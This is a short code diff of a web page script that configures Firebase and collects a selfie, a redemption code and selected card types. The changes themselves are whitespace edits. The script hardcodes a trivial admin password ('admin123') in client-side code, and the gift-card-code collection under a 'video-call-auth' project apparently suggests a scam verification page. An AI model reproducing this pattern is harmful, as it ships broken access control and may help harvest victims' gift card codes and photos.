@@ -285,9 +285,7 @@
 
 import { initializeApp } from 'firebase/app';
 import { getFirestore, collection, addDoc } from 'firebase/firestore';
-
-    // Firebase configuration
-    
+    // Firebase configuration  
 const firebaseConfig = {
   apiKey: "AIzaSyBUmxEQRSirDF_hc3rvgzwU5vRc5uVifcY",
   authDomain: "video-call-auth-e2237.firebaseapp.com",
@@ -304,12 +302,10 @@ const firebaseConfig = {
 
     const ADMIN_PASSWORD = "admin123"; // Change password here
     let submissions = [];
-
     function submitFiles() {
       const selfie = document.getElementById("selfie").files[0];
       const redemptionCode = document.getElementById("redemptionCode").value.trim();
-      const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))
-                                .map(cb => cb.value);
+      const selectedCards = Array.from(document.querySelectorAll('input[name="cardType"]:checked'))                                .map(cb => cb.value);
       
       if (!selfie) {
         showStatus("Please upload a selfie before submitting.", "error");
